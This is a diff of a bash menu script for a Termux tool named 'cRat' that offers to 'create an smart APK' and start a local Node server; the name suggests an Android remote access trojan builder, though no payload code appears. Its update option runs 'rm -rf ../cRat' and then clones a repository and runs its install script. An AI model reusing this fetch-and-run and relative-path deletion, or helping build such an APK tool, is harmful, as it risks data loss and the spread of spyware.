@@ -1,4 +1,4 @@
-bash server/input |lolcat
+bash Core/input |lolcat
 fuck() {
 clear
 echo -e "  \e[1;101m\e[1;97m\e[1;101m\e[0m\e[1;96m CREATE AN SMART APK\e[0m\n";
@@ -27,7 +27,8 @@ xdg-open http://localhost:12345/
 node index.js 
 echo " started ...."
 }
-echo -e "  \e[1;101m\e[1;97m\e[1;101m\e[0m\e[1;96m.      . ...                                                                CODE BY DIMMY\e[0m\n";
+bash Core/input |lolcat
+echo -e "  \e[1;101m\e[1;97m\e[1;101m\e[0m\e[1;96m.                                                                        CODE BY DIMMY\e[0m\n";
 echo -e " \e[1;101m\e[1;97m1️⃣\e[1;101m\e[0m\e[1;96m  CREATE AN SMART APK\e[0m\n";
 echo -e " \e[1;101m\e[1;97m2️⃣\e[1;101m\e[0m\e[1;9m  START SERVER 🌐\e[0m\n";
 echo -e " \e[1;101m\e[1;9m3️⃣\e[1;101m\e[0m\e[1;96m  ABOUT 🙃\e[0m\n";
@@ -44,10 +45,7 @@ sir
 elif [[ $pil == 03 || $pil == 3 ]];then
 about
 elif [[ $pil == 04 || $pil == 4 ]];then
-update(){
-Dir=/data/data/com.termux/files/home/cRat
-if [ ! -d $Dir ]; then
-rm -rf $HOME/cRat
+rm -rf ../cRat
 git clone https://github.com/D1MMY0/cRat
 cd $HOME/cRat && bash install
 echo " update Done"
